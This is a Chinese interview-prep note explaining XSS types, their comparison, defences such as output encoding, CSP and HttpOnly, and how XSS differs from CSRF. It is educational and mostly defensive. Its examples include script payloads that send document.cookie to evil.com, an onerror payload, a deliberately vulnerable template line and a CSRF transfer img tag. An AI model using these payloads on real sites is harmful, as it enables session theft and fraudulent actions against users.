---
tags:
  - 中间件
  - 安全
category: 安全
---

# XSS 攻击

## 面试Q&A

### Q1: 什么是 XSS？

**XSS（Cross-Site Scripting，跨站脚本攻击）**：攻击者将恶意脚本注入到网页中，当其他用户浏览该网页时，脚本在其浏览器中执行，从而窃取用户信息或执行恶意操作。

> 之所以缩写是 XSS 而非 CSS，是为了与层叠样式表（Cascading Style Sheets）区分。

**危害**：
- 窃取 Cookie / Session Token（冒充用户身份）
- 篡改页面内容（钓鱼攻击）
- 重定向到恶意网站
- 记录用户键盘输入
- 以用户身份执行操作（转账、发帖）

---

### Q2: XSS 的三种类型

#### (1) 反射型 XSS（Reflected XSS）

- 恶意脚本在 **URL 参数** 中，服务端将其"反射"到响应页面中
- **需要用户点击恶意链接**才能触发
- 一次性攻击，不会持久存储

```html
<!-- 攻击者构造的恶意链接 -->
<a href="https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>">
  点击查看结果
</a>

<!-- 服务端搜索页面（存在XSS漏洞） -->
<!-- 将URL参数直接拼接到页面中 -->
<div>搜索结果: <%= request.getParameter("q") %></div>

<!-- 渲染后变成 -->
<div>搜索结果: <script>document.location='https://evil.com/steal?c='+document.cookie</script></div>
<!-- 脚本执行，Cookie被发送到攻击者服务器 -->
```

#### (2) 存储型 XSS（Stored XSS）— 最危险

- 恶意脚本**存储在服务端数据库**中（如评论、用户名、文章）
- 每个访问该页面的用户都会执行脚本
- **持久化、影响所有用户**，危害最大

```html
<!-- 攻击者在评论区提交恶意内容 -->
<textarea>
  好文章！<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
</textarea>

<!-- 服务端存入数据库，渲染评论时 -->
<div class="comment">
  好文章！<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
</div>
<!-- 所有查看该评论的用户，Cookie都会被发送到攻击者服务器 -->
```

#### (3) DOM 型 XSS（DOM-based XSS）

- 恶意脚本通过 **DOM 操作** 注入，完全在客户端发生
- **不经过服务端**，服务端返回的 HTML 本身没有问题
- 漏洞在前端 JavaScript 代码中

```html
<!-- 页面中有如下JS代码 -->
<script>
  // 从URL hash中取数据，直接用innerHTML插入DOM
  var data = location.hash.substring(1);
  document.getElementById('content').innerHTML = decodeURIComponent(data);
</script>

<!-- 攻击者构造URL -->
https://example.com#<img src=x onerror="alert(document.cookie)">

<!-- JS执行后，DOM变成 -->
<div id="content">
  <img src=x onerror="alert(document.cookie)">  <!-- 触发XSS -->
</div>
```

---

### Q3: 三种 XSS 类型对比

| 对比维度 | 反射型 XSS | 存储型 XSS | DOM 型 XSS |
|---------|-----------|-----------|-----------|
| 存储位置 | URL 参数 | 服务端数据库 | DOM（客户端） |
| 触发方式 | 点击恶意链接 | 访问含恶意数据的页面 | 访问恶意URL + 前端JS漏洞 |
| 影响范围 | 单个受害者 | 所有访问该页面的用户 | 单个受害者 |
| 持久性 | 非持久（一次性） | 持久（长期存在） | 非持久 |
| 检测难度 | 较容易 | 较容易 | 较难（不经过服务端） |
| 危害等级 | 中 | **高（最危险）** | 中 |

---

### Q4: 如何防御 XSS？

#### 1. 输入验证/过滤（Input Validation）

```javascript
// 白名单验证：只允许期望的格式
function validateUsername(input) {
  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
}

// 过滤危险字符（不推荐作为唯一防线）
function sanitize(input) {
  return input.replace(/[<>"'&]/g, '');
}
```

> 注意：输入过滤不是万能的，某些场景下过滤可被绕过，**必须配合输出编码**。

#### 2. 输出编码（Output Encoding）— 最有效的防御

```javascript
// HTML 实体编码
function htmlEncode(str) {
  return str.replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 编码后
htmlEncode('<script>alert(1)</script>')
// → '&lt;script&gt;alert(1)&lt;/script&gt;'
// 浏览器将其显示为文本，不会执行
```

**不同上下文需要不同的编码**：

| 上下文 | 编码方式 | 示例 |
|--------|---------|------|
| HTML 元素内容 | HTML 实体编码 | `<div>用户输入</div>` |
| HTML 属性值 | HTML 属性编码 | `<input value="用户输入">` |
| JavaScript 变量 | JS 编码 | `var name = "用户输入"` |
| URL 参数 | URL 编码 | `<a href="?q=用户输入">` |
| CSS 值 | CSS 编码 | `style="color: 用户输入"` |

#### 3. Content-Security-Policy（CSP）

```http
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self'

// 含义：
// - default-src 'self'：默认只加载同源资源
// - script-src 'self' 'nonce-abc123'：只执行同源JS和带nonce的JS
// - 禁止内联脚本（<script>alert(1)</script> 不会执行）
```

```html
<!-- 配合 nonce 使用 -->
<script nonce="abc123">
  // 只有带正确 nonce 的脚本才会执行
  console.log('合法脚本');
</script>

<!-- 攻击者注入的脚本没有 nonce，不会执行 -->
<script>alert(document.cookie)</script>  ← 被CSP阻止
```

#### 4. HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly**：JavaScript 无法通过 `document.cookie` 读取该 Cookie
- 即使 XSS 攻击成功，也**无法窃取 HttpOnly Cookie**
- 这是最后一道防线，不是替代输出编码

#### 5. X-XSS-Protection 头（已弃用，了解即可）

```http
X-XSS-Protection: 1; mode=block
// 浏览器内置的反射型XSS过滤器（Chrome 78+ 已移除，CSP替代）
```

---

### Q5: XSS vs CSRF 区别？

| 对比维度 | XSS | CSRF |
|---------|-----|------|
| 全称 | Cross-Site Scripting | Cross-Site Request Forgery |
| 攻击目标 | **用户的浏览器**（执行脚本） | **服务端**（伪造用户请求） |
| 攻击方式 | 注入恶意脚本 | 伪造合法请求（利用已认证的Cookie） |
| 是否需要注入代码 | 是 | 否 |
| 是否依赖Cookie | 不一定（但常窃取Cookie） | 是（利用Cookie自动发送） |
| 防御方式 | 输出编码、CSP、HttpOnly | CSRF Token、SameSite Cookie、Referer检查 |

```html
<!-- CSRF 攻击示例 — 不需要注入JS，只需构造请求 -->
<!-- 受害者已登录 bank.com，Cookie有效 -->
<!-- 攻击者页面自动发送转账请求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" style="display:none">
<!-- 浏览器自动带上 bank.com 的 Cookie → 转账成功 -->
```

---

### Q6: 前端框架对 XSS 的防护？

| 框架 | 默认行为 | 危险API |
|------|---------|---------|
| React | JSX 自动转义（HTML编码） | `dangerouslySetInnerHTML` |
| Vue | 模板 `{{ }}` 自动转义 | `v-html` |
| Angular | 模板自动转义 | `innerHTML` 绑定（仍会过滤） |

```jsx
// React — 默认安全
const name = '<script>alert(1)</script>';
<div>{name}</div>  // 安全：显示为文本

// 危险！绕过转义
<div dangerouslySetInnerHTML={{__html: name}} />  // XSS漏洞
```

---

## 一句话总结

**XSS是注入恶意脚本到网页在用户浏览器执行，分反射型（URL参数）、存储型（数据库持久化，最危险）、DOM型（客户端DOM操作），核心防御是输出编码（HTML实体编码）+ CSP + HttpOnly Cookie。**
